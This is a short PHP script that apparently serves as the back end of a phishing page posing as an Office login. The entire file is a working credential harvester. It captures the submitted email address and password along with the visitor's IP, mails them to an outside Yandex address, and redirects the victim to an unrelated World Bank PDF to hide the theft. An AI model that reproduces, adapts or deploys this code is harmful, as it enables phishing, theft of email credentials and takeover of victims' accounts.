<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Office tare_ama || :------\n";
$message .= "email: ".$_POST['user']."\n";
$message .= "Pass: ".$_POST['pass']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="boxx.r@yandex.com";
$subject = "tare other mail | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://openknowledge.worldbank.org/bitstream/handle/10986/25697/9781464809941.pdf");
?>